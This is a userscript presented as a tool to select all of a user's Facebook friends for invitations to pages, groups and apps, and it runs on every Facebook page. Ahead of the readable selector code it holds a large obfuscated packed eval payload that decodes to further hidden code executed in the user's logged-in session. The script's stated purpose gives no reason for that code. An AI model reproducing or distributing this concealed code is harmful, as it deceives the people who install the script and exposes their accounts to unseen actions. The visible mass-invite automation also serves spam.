// ==UserScript==
// @name          Select ALL Facebook Friends Plus1
// @description	  Easily invite all of your friends to your fan pages, groups, and some apps on Facebook. By default, it will add ALL, but you can select a range if you only want to add a certain number of your friends.
// @namespace     http://arvo.im/
// @include       http://www.facebook.com/*
// @include       https://www.facebook.com/*
// Developed by Makis Arvo
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(c/a))+String.fromCharCode(c%a+161)};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\[\xa1-\xff]+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(e(c),'g'),k[c])}}return p}('Ã³(Ã±.Ã¯(Â¢,Ã™,Â©,Â±,Â¥,Â¶,Â°,Â¦,Â§,Â£,Â¨,Â¬,Â¦,Â¥,Â³,Â²,Â©,Â²,Â§,Â²,Ã,Â²,Â¢,Â²,Â´,Â¤,Â»,Â¢,Â­,Â¶,Â°,Â¦,Â§,Â£,Â¨,Â¬,Â¦,Â¥,Â§,Â¤,Â»,Âª,Â¢,Â£,Â°,Âª,Â¦,Â¥,Â§,Ã°,Â©,Ã”,Âµ,Âµ,Ã,Â¢,Â¥,Â³,Â©,Âª,Â«,Â¢,Ã¡,Â¦,Â£,Â¥,Â§,Â¾,Â©,Â¤,Â¤,Â¤,Â¹,Â¥,Â¥,Â§,Â­,Â§,Ã²,Â©,Â¤,Ã®,Âº,Ã‘,Ã”,Ã,Â£,Âª,Â¨,Â¦,Ãƒ,Â¯,Â¶,Âª,Â¬,Ã„,Ã•,Ã†,Â©,Âª,Ã•,Â¬,Â´,Â¢,Â¥,Â§,Â¹,Â¸,Ã˜,Â¤,Ã,Â§,Â¯,Â£,Â¬,Ã,Â£,Âª,Â¨,Â¦,Ãƒ,Â¥,Âº,Ã‚,Â¤,Â¤,Â½,Ãˆ,Â¨,Â¶,Â¥,Ã£,Âµ,Âµ,Â¯,Âª,Â¢,Â³,Â±,Â©,Â§,Â¢,Â¥,Â¾,Ã¬,Â¾,Â²,Ã,Â£,Âª,Â¨,Â¦,Ãƒ,Â¤,Â¤,Â»,ÃŠ,Ã†,Â¨,Â±,Â¢,Â¥,Â§,Ã’,Ã’,Â¤,Â»,Â´,Ã‹,Â¢,Â¥,Â§,Â¤,ÃŒ,Â­,Ã,Ã‹,Â§,ÃŒ,Â¡,Â¡,Â¢,Â¥,Â§,Â¤,Â½,Ã,Â­,Ã‹,Â¶,Â°,Â¦,Â§,Â£,Â¨,Â¬,Â¦,Â¥,Â¢,Â¤,Â»,Âª,Â¢,Â£,Â°,Âª,Â¦,Â¿,Â´,Ã‹,Â¢,ÃŒ,Â½,ÃŒ,Ãˆ,Â¢,Â­,Â¶,Â°,Â¦,Â§,Â£,Â¨,Â¬,Â¦,Â¥,Â¤,Â»,Âª,Â¢,Â£,Â°,Âª,Â¦,Âµ,Ã…,Ã…,ÃŠ,Â¹,Âµ,Â½,Ãˆ,Â§,Â­,Ã‡,Â½,Ãˆ,ÃŠ,Ã†,Â¨,Â±,Â¢,Â¥,Â§,Ã’,Ã’,Â¤,Â»,Â¨,Â¶,Â¥,Ã,Ã‹,Â§,ÃŒ,Â¤,Â»,Â³,Â­,Â³,Â¯,Âª,Â¢,Â³,Â±,Â©,Â§,Â¢,Â¥,Â¦,Â¢,ÃŠ,Â¿,Ã“,Â¢,Ãƒ,Ã–,ÃŸ,Â³,Â¥,Âµ,Ã…,Ã…,Â¼,Âµ,Â¹,Â¢,Â¥,Â§,Â¤,Â¹,Âµ,Ã…,Ã…,Â¼,Âµ,Â²,Âµ,Ãƒ,Âµ,Â¤,Â²,Ã,Ã‹,Â§,ÃŒ,Â¤,Â½,Â½,Âª,Â¢,Â£,Â°,Âª,Â¦,Â¿,Â³,Â½,Â¥,Âµ,Ã‰,Â¿,Â©,Â¥,Â¦,Â¤,Â»,Ã‘,Â¿,Â£,Â­,Â¶,Â¿,Ã¥,Â²,Âª,Â­,Â®,Â¾,Ãƒ,Â¾,Ã—,Â¾,Ã­,Â¯,ÃŽ,Ã”,ÃŠ,Â­,Ã‡,Â®,Â²,Â¨,Â­,Â®,ÃŸ,Â­,Â®,Â¹,Â¦,Â¹,Â®,Ã,Â¼,Â­,Ã‡,Ã,Ã©,Â­,Ã—,Ã’,Ã•,Ã,Ã½,Â­,Ã™,Ã,Âº,Â­,Â®,Â¹,Âº,Â¹,Â®,Ã,Ã–,Ã,Ã¦,Â®,Â¹,Â¢,Â¹,Â®,Ã,Ãœ,Â­,Â®,Ãˆ,Â£,Â¯,Â«,Â¥,Â®,Â±,Â®,Â²,Âª,Â²,Ã£,Â·,Â¤,Â²,Â£,Â¯,Ã„,Â­,Ã‰,Â¥,Â¤,Â»,Â£,Â¯,Â°,Â­,Â­,Ã,Ã,Ã,Â£,Â¯,Â³,Â­,Â­,Ãš,Ã,Ã,Â£,Â¯,Â¬,Â½,Â²,Â£,Â¯,Ã˜,Â¥,Â¨,Â¤,Â½,Ã‰,Â¿,Ã‚,Â¥,Â¦,Â¤,Â»,Ã‘,Â¿,Â£,Â­,Â¸,Â¯,Ã,Â¥,Â®,Ãº,Â®,Â¤,Ãˆ,Â£,Â¯,Ã›,Â­,Â®,Â¶,Â¿,Ã»,Â¥,Â¤,Â¯,Ã¤,Â¥,Ã…,Âµ,Â¾,Ãƒ,Â¾,Ã¡,Â¾,Ã¨,Â¾,Â§,Â¾,Ã¼,Ã”,Â¼,Â­,Ã¹,Ã,Ã¸,Â­,Â§,Ã…,Âµ,Â¤,Â¯,Ã“,Â¥,Â»,Â¿,Ã,Ã,Â¿,Â®,Â¹,Â¦,Â¹,Â®,Â¿,Â½,Â¤,Â¯,Ã˜,Â¥,Â¤,Ãˆ,Â®,Â²,Â¸,Â¯,Ã´,Â¯,Ãµ,Â¥,Â£,Â¤,Â½,Ã‘,Â¿,Âº,Â­,Â¸,Â¯,Ã¢,Â¥,Â®,Âº,Â®,Â¤,Ã‹,Â·,ÃŒ,Â¯,Ã«,Â²,Â¢,Â­,Â¸,Â¯,Ãž,Â¯,Ã†,Â¥,Â¸,Â¯,Ãž,Â¯,Ã†,Â¥,Â¾,Ã¶,Â­,Â¥,Ã…,Ã…,Â´,Â¹,Â¤,Â¾,Â¤,Ã‹,Ã‡,ÃŒ,Â¤,Ãˆ,Â©,Â¥,Â®,Ãª,Â®,Â¤,Â²,Ã‚,Â¥,Â®,Ã§,Â®,Â¤,Â²,Ã‚,Â¥,Â®,Ã ,Â®,Â¤,Ãˆ,Âµ,Â²,Ã‚,Â¸,Â²,Ã‚,Â¸,Â²,Âµ,Â¡,Â¡,Â´,Â¬,Â§,Â°,Ã„,Â¢,Â¦,Â£,Â¡,Â¶,Â¼,Ã€,Â´,Â£,Â«,Ãƒ,Â¡,Â¡,Ã™,Â©,Âª,Â¡,Â«,Â°,Â¼,Â±,Â¨,Â«,Â£,Â¡,Â¶,Â°,Â¦,Â§,Â£,Â¨,Â¬,Â¦,Â¡,Â¶,Â¬,Â±,Â±,Â¬,ÃŠ,Â¡,Â«,Â¢,Â¦,Â´,Â¡,Â¡,Â±,Â¬,Â§,Â©,Â£,Â¨,Â¬,Â¦,Â¡,Â«,Â°,Â¼,Â«,Â§,Âª,Â¨,Â¼,Â¢,Â¡,Â¡,Â°,Â«,Â¢,Âª,Ã€,Â¨,Â´,Â¡,Â¦,Â¢,ÃŠ,Â¡,Â©,Ãž,Â©,ÃŸ,Â¡,Ã„,Â©,Â£,Â§,Ã†,Â¡,Â¡,Â§,Â¬,Â¬,Ã,Â¨,Â¢,Â¡,Â§,Âª,Â¢,Â©,Â£,Â¢,Ã–,Â±,Â¢,Ã„,Â¢,Â¦,Â£,Â¡,Ãª,Ã§,Ã,Ã ,Â¡,Â¬,Â¦,Âª,Â¢,Â©,Â´,ÃŽ,Â«,Â£,Â©,Â£,Â¢,Â§,Ã†,Â©,Â¦,Ãƒ,Â¢,Â¡,Â¡,Â§,Â±,Â¬,Â«,Â¢,Â¡,Â«,Â£,Â©,Â£,Â°,Â«,Â¡,Â¸,Â·,Â·,Â¡,Â¡,Â¬,Â³,Â¢,Â¦,Â¡,Â¡,Âª,Â¢,Â©,Â´,ÃŽ,Ã,Â£,Â©,Â£,Â¢,Â¡,Â°,Âº,Ã‰,Ãš,Â©,Â§,Ã€,Âº,Ã‰,Â¡,Ã€,Ã€,Â©,Â¡,Â³,Âª,Â¬,Â¶,Â¨,Â±,Â¢,Ã€,Â¨,Â´,Â¡,Â³,Ã†,Â³,Â¡,Â¶,Â¬,Â±,Â±,Â¬,ÃŠ,Ã€,Â³,Âª,Â¬,Â¶,Â¨,Â±,Â¢,Â¡,Ã¨,Ã¢,Ã›,Ãœ,Â£,Â£,Â³,Ã“,Â¢,Ãš,Â°,Â¢,Â«,Â£,Â¡,Â«,Â¬,Â°,Âª,Â§,Â¢,Â¡,Â¼,Â°,Â£,Â£,Â¬,Â¦,Â¡,Ã€,Ã€,Â¡,Â±,Â«,Â´,Â¡,Â«,Â§,Âª,Â¨,Â³,Â£,Â¡,Â«,Â°,Â¼,Â«,Â§,Âª,Â¨,Â¼,Â¢,Â´,Ã€,Â¼,Â°,Â£,Â£,Â¬,Â¦,Ã€,Â¨,Â´,Â¡,Â³,Ã†,Â«,Â£,Â©,Ã„,Â³,Â¡,Â¶,Âª,Â¨,Â¢,Â¦,Â´,Â«,Â¡,Â©,Â³,Â³,Â¢,Â¦,Â´,Ã•,Ã†,Â¨,Â±,Â´,Â¡,Â¼,Â¬,Â´,ÃŽ,Â¡,Â¨,Â¦,Â¦,Â¢,Âª,Ãœ,Ã ,Ã¢,Ã›,Â¡,Ãƒ,Â¢,Â£,Ã–,Â±,Â¢,Ã„,Â¢,Â¦,Â£,Â«,Ã©,ÃŽ,Ã«,Â©,Ã„,Â¢,Â¡,Ã™,Â©,Â±,Â°,Â¢,Â¡,Ã‡,Â·,Â·,Âº,Ã,Ã,Ã‡,Ã‚,Ã‚,Ã—,Âº,Ã‡,Ã‚,Ã‰,Ã‘,Â¡,Ã‡,Â·,Â·,Â·,Â·,Âº,Â·,Â·,Ã˜,Â¸,Â·,Ã‡,Ã‘,Âº,Ã,Â¡,Â§,Ã€,Â°,Â«,Â¢,Âª,Â¡,Â«,Â¢,Â£,Ã¦,Â©,Â£,Â©,Â¡,Â¶,Â±,Â¨,Â´,Â¡,Â¸,Ã,Ã‚,Ã‰,Â·,Ã‰,Ã,Âº,Â¸,Ã‡,Â·,Ã‚,Â¸,Â¸,Ã—,Â¡,Â«,Â¢,Â£,Ã¤,Ã“,Ã¡,Â¡,Ã¥,Â«,ÃŽ,Â¦,Â§,Ã“,Â¢,Ãš,Â°,Â¢,Â«,Â£,Â¡,Ã„,Â¬,Â´,Â¨,Â¶,ÃŽ,Â¡,Â±,Â¨,Â«,Â£,Â«,Â¡,Â©,Â§,Â£,Â¨,Â¬,Â¦,Â¡,Â³,Â¢,Âª,Ã„,Â©,Â±,Â¨,Â¦,Ã,Âµ,Â¯,Â«,Â³,Â±,Â¨,Â£,Â¥,Âµ,Â¡,Âµ,Â¤,Â²,Â·,Â²,Â»,Â½,Â¤,Â¤,Ã·))',93,93,'124|101|116|41|40|110|99|105|97|114|115|111|61|34|46|117|108|44|112|100|39|102|48|50|43|51|123|98|125|47|32|95|38|54|103|109|92|104|49|59|55|119|91|93|107|121|83|52|53|45|82|63|67|69|56|57|118|113|76|72|58|106|120|84|73|77|33|85|65|68|79|88|66|80|78|94|122|62|fromCharCode|60|String|37|eval|75|74|81|10|89|90|70|86|87|71'.split('|'),0,{}))





(function() {
	inter = 0;
	function startit() {
		if (inter != 0)
			return;
		buts = document.getElementById('fb_multi_friend_selector_wrapper');
		if (buts) {
			Others = '<div style="border:1px solid #C1C1C1; padding:5px; margin-top: 10px;"><label>Start #:</label> <input class="inputtext" type="text" value="0" id="startpt" size="5"/>&nbsp;&nbsp;&nbsp;&nbsp;<label>End #:</label> <input class="inputtext" type="text" value="'+document.getElementById('all_friends').childNodes.length+'" id="end"  size="5"/>&nbsp;&nbsp;'
			Link = '<span class="UIButton UIButton_Blue UIFormButton"><input class="UIButton_Text" type="button" onclick="start=document.getElementById(\'startpt\').value;howmany=document.getElementById(\'end\').value - start;j=0;cont=document.getElementById(\'all_friends\').childNodes; for ( i=start; i<cont.length; i++) {temp = cont[i].childNodes; temp1 = temp[0]; temp1.onclick();j++; if (j>=howmany) break;}; return false;" href="Javascript:void(0)" value="Select Friends"/></span></div>';
			parent = document.getElementById('fb_multi_friend_selector_wrapper');
			buts = document.createElement('div');
			buts.innerHTML = Others + Link;
			parent.appendChild(buts);

			inter = 1;
		}
		setTimeout(startit, 2000);
	}
	setTimeout(startit, 100);
})();